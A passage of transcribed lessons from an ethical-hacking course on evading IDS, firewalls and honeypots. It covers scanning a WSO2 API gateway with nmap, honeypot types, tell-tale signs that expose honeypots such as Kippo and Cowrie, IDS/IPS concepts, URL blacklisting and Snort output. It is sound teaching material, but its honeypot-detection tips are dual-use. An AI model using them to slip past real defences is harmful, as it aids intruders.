> **[7:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=443)** I'll select this to be a managed API and use the HTTP/REST endpoint.
>
> **[7:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=453)** I'll set the production URL and the sandbox as the same.
>
> **[7:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=462)** I can now proceed to manage this.
>
> **[7:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=467)** I'll set HTTP transport only and set Gold as the tier.
>
> **[7:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=472)** And I'll save and publish.
>
> **[7:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=474)** Now, we can return to the overview screen.
>
> **[7:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=477)** Okay, we have our first published API.
>
> **[8:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=481)** I'll now go to the store.
>
> **[8:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=483)** I can see PhoneView API is now available.
>
> **[8:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=486)** I'll sign in.
>
> **[8:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=488)** When I click on PhoneView, we can see that this is accessible from our server through port 8280.
>
> **[8:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=499)** I won't spend any more time on the API itself, but let's go back to the command prompt and use nmap to check out how the target server looks now.
>
> **[8:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=508)** Okay, so we're pretty much the same.
>
> **[8:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=510)** But we know we have services on ports 9443 and also 8280.
>
> **[8:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=516)** And I also saw references to ports 7611 and 7711 during startup.
>
> **[8:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=521)** Let's try that scan again with a bit more focus.
>
> **[8:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=527)** Now, we get four open ports.
>
> **[8:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=529)** So all is not quite as locked down as it seems and we can usefully invest time learning about the gateway.
>
> **[8:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=536)** For WSO2, you may also want to check ports 10389 and 45564.
>
> **[9:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=543)** In order to be an effective Agile developer, you need to be able to identify the API interfaces and sandpits, as these are likely to be sources of weakness in the services.
>
> **[9:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=553)** You also need to be able to fingerprint and understand the characteristics of API gateways in order to test whether their security features have been invoked properly.

> [!info]- Semantic Content
>
> **Env Vars:** api (23), url (5), wso2 (5), json (3), http (2)
> **Code Keywords:** let (9), this. (2), interface (1), case, (1)
> **UI Navigation:** click on (2), select the (2), scroll down (1), go to (1)
> **Ports:** port 9443 (1), port 8280 (1)
> **Versions:** 10.0.2 (1), version 0 (1)
> **Cross-References:** go back to (2)
> **Definitions:** is a  (1), is an  (1)
> **Analogies:** such as (2)

#### Understand honeypots
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=0)** - [Instructor] One of the techniques that has been used for many years to detect intruders at the perimeter and inside networks is that of honeypots.
>
> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=8)** A honeypot is a target which purports to be a legitimate system, but in fact, it's a lure put in place by a defender to trap an intruder.
>
> **[0:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=17)** The objective may be to identify and prosecute, but more often, it's to monitor, and understand the attack techniques, and eventually, discourage them from attacking the site.
>
> **[0:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=27)** Honeypots typically come as either low-interaction honeypots which presents a service interface, but have little inside to maintain their pretense as real systems.
>
> **[0:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=37)** A high-interaction honeypot, on the other hand, provides a close to real system which tries to keep the attack engaged as long as possible.
>
> **[0:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=45)** A honeynet is a network of honeypots purporting to be a complete network environment of real systems.
>
> **[0:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=52)** Once an attacker's source address is known, then can be sinkholed where their traffic, and any uploaded malware can be analyzed, and the attackers are safely contained.
>
> **[1:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=63)** Attackers will often however, have many IP addresses so this may only provide a temporary reprieve.
>
> **[1:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=69)** A lot of the activity around honeypots occurs in The Honeynet Project, a non-profit initiative which has been operating since 1999.
>
> **[1:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=78)** Let's have a look at some of the honeypot projects they list.
>
> **[1:21](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=81)** The number of honeypot tool develop was significant.
>
> **[1:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=85)** The list shown on the Honeynet site provides a view of the number and sophistication of these tools.
>
> **[1:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=92)** Capture-HPC is a high-interaction honeypot, but the latest release is now seven years old.
>
> **[1:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=99)** HIHAT is another slightly older high-interaction honeypot which offer some interesting features.
>
> **[1:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=105)** It uses existing PHP scripts and automatically converts them into honeypots, allowing commonly used services to be instrumented for attacks.
>
> **[1:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=114)** It provides attack geolocation as part of its analysis.
>
> **[1:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=118)** A more recent high-interaction honeypot is Dockpot which is evolved from Kippo.
>
> **[2:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=123)** This is available for download from GitHub.
>
> **[2:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=126)** Kippo is a popular mid-interaction honeypot which has been used extensively.
>
> **[2:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=131)** While this is now a little old, it's been formed by Michel Oosterhof to create cowrie, a medium-interaction SSH and Telnet honeypot, designed to log brute-force attacks and the shell interaction performed by the attacker.
>
> **[2:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=145)** It purports to be a Debian 5 system and maintains a full file system.
>
> **[2:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=150)** We'll look at this honeypot shortly.
>
> **[2:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=152)** As much as there is research going on into developing honeypots to collect attack information and catching intruders, a parallel stream of research is looking at identifying whether a site is a honeypot.
>
> **[2:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=164)** Most honeypots can be detected.
>
> **[2:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=166)** They attempt to emulate real systems, but often fail to deliver real system functionality.
>
> **[2:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=172)** One example given by Tyler Borland in a blog posting presented here is executing commands at login such as using SSH, root out whatever dot com.
>
> **[3:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=181)** He also notes the target behavior when using add user.
>
> **[3:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=185)** Kippo endlessly loops through the add user screen so it's easily detected.
>
> **[3:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=190)** However, many of the honeypots simply won't let you add users or will only pretend to add the user.
>
> **[3:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=196)** It's often easy enough to detect the target is a honeypot by attempting to use the new account.
>
> **[3:21](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=201)** In addition, a session restart usually just refreshes the system as if nothing happened in the previous session.
>
> **[3:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=207)** For example, deleting files.
>
> **[3:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=209)** Jon Oberheide, sometime ago, provided a detection technique for Honeyd based on this incorrect reassembly of packet fragments.
>
> **[3:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=218)** This was developed into a tool called winnie which has subsequently become obsolete.
>
> **[3:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=224)** Like many things in security, honeypots and their detection is something of a cat and mouse game.
>
> **[3:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-honeypots?u=76281980&t=230)** The Shodan site , Honeyscore provides an intimate base service to check whether an IP address, which at first glance purports to be an industrial control system, is likely to be a honeypot.

> [!info]- Semantic Content
>
> **Definitions:** is a  (6)
> **Env Vars:** ssh (2), hpc (1), hihat (1), php (1)
> **CLI Commands:** ssh (2), php (1), cat (1)
> **Code Keywords:** let (2), interface (1)
> **Analogies:** such as (1), for example (1)
> **Tools:** github (1)
> **Speakers:** - [instructor] (1)

#### Run the Cowrie honeypot
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=0)** - [Instructor] I've made a clone of my Ubuntu system and run APT Get update and APT Get upgrade to get it up to date.
>
> **[0:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=9)** Installing Cowrie is fairly straightforward, although there are some dependency issues that you might encounter.
>
> **[0:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=15)** We'll start by installing the main library dependencies.
>
> **[0:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=27)** Okay, we're now ready to go.
>
> **[0:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=30)** If the start script complains of missing dependencies in your Ubuntu configuration, then find the libraries and install them.
>
> **[0:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=37)** Okay, we've started.
>
> **[0:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=39)** I'll go into my Cowrie system and see what I can see.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=42)** Just before I do that, I'll check my IP address.
>
> **[0:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=46)** Right, we're on 10.0.2.19.
>
> **[0:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=49)** Let's nmap the server.
>
> **[0:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=54)** Okay, we can see port 22 is open and somewhat incriminating port 8022.
>
> **[1:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=60)** Let's try to log into port 22.
>
> **[1:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=66)** I'll guess the password.
>
> **[1:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=70)** And we get in.
>
> **[1:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=71)** In fact, Cowrie allows any password, other than those explicitly excluded in its data/userdb.text file.
>
> **[1:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=79)** By default root and 123456 are excluded, anything else is allowed.
>
> **[1:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=84)** You can configure this to be as open or as restrictive as you like.
>
> **[1:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=88)** Let's snoop around.
>
> **[1:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=97)** Back in the Ubuntu system, we can go into the log folder and look at what we've collected.
>
> **[1:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=105)** And we can see we're collecting a log of all the intruder's activity.
>
> **[1:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=109)** It's useful to test it to play with tools such as Cowrie.
>
> **[1:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/run-the-cowrie-honeypot?u=76281980&t=113)** To become familiar with their characteristics and to spot them when you're testing.

> [!info]- Semantic Content
>
> **CLI Commands:** apt (2), find (1)
> **Code Keywords:** let (3)
> **Ports:** port 22 (2), port 8022 (1)
> **Env Vars:** apt (2)
> **Prerequisites:** install (1), configure (1)
> **Versions:** 10.0.2 (1)
> **Analogies:** such as (1)
> **Speakers:** - [instructor] (1)


### 5. Protection from Intrusion

#### Intrusion response techniques
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=1)** - [Instructor] When architecting a system, it's important to provide defense in depth.
>
> **[0:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=5)** One of the leading security architecture frameworks, the Sherwood Applied Business Security Architecture, or SABSA, provides a model of defense in depth controls called the Multitier Control Strategy.
>
> **[0:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=17)** We can see that it incorporates second-layer prevention and fourth-layer detection and notification controls.
>
> **[0:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=24)** Let's look at what we do for detection controls.
>
> **[0:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=27)** An intrusion detection system, or IDS, provides a means of detecting and notifying the security operator that an intrusion may have been detected based on its match to a known attack signature.
>
> **[0:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=39)** IDS systems may be network-based devices, sometimes called NIDS, or host-based systems, called HIDS.
>
> **[0:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=47)** IDS systems require regular signature updates in order to be able to detect the most up-to-date attacks.
>
> **[0:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=54)** A typical business environment would do signature updates every two to three hours, whereas a home user may only schedule signature updates daily or even weekly.
>
> **[1:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=65)** An IDS will raise an alert when it detects what it believes to be an intrusion, and this will go to some form of dashboard or security information and event management system.
>
> **[1:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=75)** These alerts needs to be watched and handled by a security operator.
>
> **[1:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=80)** Typically, there will be at least two levels of operator, the first doing the bulk of the filtering of alerts that are false positives, and the second, then, doing the investigation and the analysis of the rest of the alerts.
>
> **[1:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=93)** An intrusion prevention system is an IDS with the ability to automatically respond to an intrusion by blocking traffic, which it has detected as malicious, and possibly even blacklisting the source.
>
> **[1:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=106)** Your antivirus solution is an example of a host-based IPS.
>
> **[1:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=111)** At the enterprise level, network IPS are often deployed in monitoring mode, that is, with the prevention stage turned off and operating just as an IDS.
>
> **[2:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=122)** However, an IPS may never progress beyond monitoring because the risk of a service outage due to a false positive triggering the IPS will often be too high for the business to accept.
>
> **[2:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=133)** Some attacks don't have a specific signature that can be detected or haven't yet been classified with a signature but do behave in a way which indicates malicious activity.
>
> **[2:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=144)** An anomaly detection system is a device which watches the behavior of data streams and can detect that anomalous activity.
>
> **[2:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=153)** In general, anomaly detection systems use a learning subsystem to build a model of normal data flows and then detect deviations from the normal model in observed data flows.
>
> **[2:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=164)** They're deployed initially in the host, or on the network, in learning mode, and then a switch to detection mode once a sufficient period of time has elapsed.
>
> **[2:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=174)** They may also allow the manual entry of customized profiles, providing thresholds beyond which the activity could be considered an anomaly.
>
> **[3:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=184)** For instance, the number of emails per second from a workstation, or the number of user access attempts.
>
> **[3:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=191)** There are two major classes of anomaly detection techniques.
>
> **[3:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=195)** Protocol anomalies, where the traffic doesn't match known ways of using the protocol or structuring the data.
>
> **[3:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=202)** This may indicate an attempt to exploit an implementation bug using invalid protocol data.
>
> **[3:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=208)** Statistical anomaly, where a probability score is calculated for each of the data packets that's considered as normal traffic.
>
> **[3:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=216)** The scores are computed based on the sample data over a period of time and stored in a baseline profile.
>
> **[3:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=223)** A threshold is set for each of the protocols and users, and anything beyond the threshold will trigger an anomaly alert.
>
> **[3:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=231)** One of the problems with today's ADS, and to a lesser extent, IDS, is that, often, the detection will be a false positive, which is where the legitimate activity has triggered the detection code in the IDS.
>
> **[4:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=245)** This typically happens when a stream of legitimate packets contains the same sequence of coding as the attack signature.
>
> **[4:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=252)** Many IDS alerts are indeed false positives, and the false positive rate is often used as a performance measure for the effectiveness of the particular IDS device.
>
> **[4:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=262)** False positives are a significant weakness for an intrusion detection system because after a while, an error-prone system is just ignored and not used anymore.
>
> **[4:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=273)** While there are both annoyances and risks with false positives, false negatives are more concerning, as these are where an IDS has allowed a malicious intrusion to pass into the system without detecting it.
>
> **[4:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/intrusion-response-techniques?u=76281980&t=285)** This, of course, is a critical problem, as even just one false negative means the system can be completely compromised.

> [!info]- Semantic Content
>
> **Env Vars:** ids (11), ips (4), sabsa (1), nids (1), hids (1)
> **Code Keywords:** let (1), require (1), raise (1), switch (1), while, (1)
> **Definitions:** is an  (2), is a  (2)
> **UI Navigation:** go to (1), switch to (1)
> **Analogies:** for instance (1)
> **Speakers:** - [instructor] (1)

#### xListing sites
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/xlisting-sites?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/xlisting-sites?u=76281980&t=1)** - [Instructor] One way to get malware through the perimeter is to have a user reach out to a website and invite it in.
>
> **[0:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/xlisting-sites?u=76281980&t=7)** This happens when the web server has been compromised and the user browser has an exploitable vulnerability.
>
> **[0:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/xlisting-sites?u=76281980&t=15)** There are two key techniques to reduce the threat from malicious websites.
>
> **[0:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/xlisting-sites?u=76281980&t=19)** The first technique is blacklisting.
>
> **[0:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/xlisting-sites?u=76281980&t=22)** The perimeter web proxy maintains a list of known malicious websites.
>
> **[0:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/xlisting-sites?u=76281980&t=26)** And when a user makes a request, it's checked against the list.
>
> **[0:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/xlisting-sites?u=76281980&t=30)** If the website is on the list, the user connection is rejected.
>
> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/xlisting-sites?u=76281980&t=34)** Blacklisting can only protect against the malicious websites that are known, not those that have yet to be included on the list.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/xlisting-sites?u=76281980&t=42)** The second technique is whitelisting.
>
> **[0:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/xlisting-sites?u=76281980&t=45)** This is where the web proxy maintains a list of known good sites and only lets connections through to those sites.
>
> **[0:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/xlisting-sites?u=76281980&t=52)** This is a more effective technique than blacklisting, as it's much easier to keep the whitelist complete and up to date than the blacklist.

> [!info]- Semantic Content
>
> **Definitions:** is a  (1)
> **Speakers:** - [instructor] (1)

#### Snort rules
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=1)** - [Instructor] Snort is a network-based IDS that uses rule-based detection and runs on a wide variety of platforms.
>
> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=8)** It works by sniffing network data packets and examining their content to see whether they match known attacks.
>
> **[0:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=15)** It's based on the tcpdump utility which reads packets and adds a packet analytics engine which checks for malware using detection rules.
>
> **[0:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=25)** Snort also provides plugins to do pre-analysis processing to make detection easier and post-analysis processing to prepare for logging and alerting.
>
> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=34)** On its own, Snort provides simple text line output, which is not formatted in any way that provides easy review.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=42)** However, the utility called the Analysis Console for Intrusion Detection, or ACID, works very well with Snort log files to provide a much more manageable monitoring console.
>
> **[0:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=54)** Snort can be installed as a standalone setup where it's used just to check its host.
>
> **[0:59](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=59)** However, it's designed to be a network IDS which monitors a subnet and, in fact, can be deployed in the form of multiple sensors and a central database and monitoring station.
>
> **[1:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=70)** In this configuration, it can be optimized to enable maximum effectiveness for packet capture.
>
> **[1:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=76)** Snort alert output can be delivered in a number of ways.
>
> **[1:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=80)** The basic text line can be output using the configuration, alert_fast, which minimizes the processing required, but has only basic information.
>
> **[1:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=90)** The alternative is to alert_full, which requires more processing, but does provide more detailed information.
>
